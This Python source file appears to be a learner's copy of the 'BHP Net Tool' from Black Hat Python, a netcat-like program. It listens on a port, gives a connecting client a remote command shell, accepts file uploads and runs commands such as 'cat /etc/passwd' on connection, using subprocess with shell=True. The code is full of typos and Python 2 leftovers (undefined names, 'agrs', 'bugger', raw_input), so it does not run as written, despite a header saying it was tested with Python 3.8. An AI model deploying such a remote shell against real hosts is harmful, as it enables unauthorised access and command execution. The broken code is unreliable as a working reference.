"""
The code is from black hat python(black-hat-python(9781457189807)

Tested with python 3.8

"""

import sys
import socket
import getopt
import threading
import  subprocess






"""
varaibles
listen = False
command = False
upload = False
execute =  ""
target = ""
upload_destination = ""
port = 0

method overr


usage

main

client_sender

"""

listen = False
command = False
upload = False
execute =  ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("BHP Net Tool\n")
    print("Usage: bhpnet.py -t target_host -p port\n")
    print("-l --listen              - listen on [host]:[port] for incoming connections\n")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection\n")
    print("-c --command             - initialize a command shell\n")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destination]\n")
    print("\n\n")
    print("Examples: \n")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c\n")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\ "+ "\n")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\n")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #read the commandline option
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",
        ["help","listen","excute","target","port","command","upload"])
    except getopt.GetoptError as err:

        print(str(err))

        ussage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-T", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled option"


    #are we going to listen or just send data from stdin

    if not list and len(target) and port > 0:

        #read in the buffer from the commandline
        #the will block, so send CTRL-D if not sending input
        #to stdin

        buffer = sys.stdin.read()

        #send data off

        client_sender(buffer)

    if listen:
        server_loop()


def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connection((target,port))

        if len(buffer):
            client.send(bugger)

        while True:
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)

                recv_len = len(data)

                response+= data
            print(response)
            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)

    except:

        print("[*] Exception Exiting.")

        client.close()

        
def server_loop():
    global target

    #if no target is defined, we listent on all interfaces

    if not len(target):
     target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)


    while True:
        client_socket , addr = server.accept()

        client_thread = threading.Thread(target = client_handler, agrs=(client_socket,))
        client_thread.start()

def run_command(command):

    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output



def client_handler(client_socket):
    
    global upload
    global execut
    global command


    #check for upload

    if len(upload_destination):
        #read in all of the bytes and write to our destination

        file_buffer = ""
        
        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_bufferf += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved to %s\r\n" % upload_destination)


        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    #check for command execution
    if len(execute):
        #run the command
        output=run_command(execute)
        client_socket.send(output)

    if command:

        while True:
            #show a simple prompt
            client_socket.send("<BHP:#>")

            #now here we should receive a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #send back the command output

            repsonse = run_command(cmd_buffer)

            #send back the response

            client_socket.send(response)

            
            
        

main()

    
